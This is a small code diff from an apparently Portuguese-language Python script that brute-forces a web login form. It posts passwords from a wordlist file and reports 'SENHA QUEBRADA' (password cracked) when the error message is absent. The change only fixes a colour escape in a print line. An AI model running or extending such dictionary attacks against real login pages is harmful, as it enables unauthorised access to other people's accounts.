@@ -20,6 +20,6 @@ with open('password.txt') as file:
          response = requests.post(url,data=payload)
 
          if "Usuário ou senha errada!" not in response.text:
-             print('\033[92m[+]- SENHA QUEBRADA ==> ', senha,'\>
+             print('\033[92m[+]- SENHA QUEBRADA ==> ', senha,'\033[0m')
          else:
              print('\033[91m[+]- ', senha,'\033[0m')
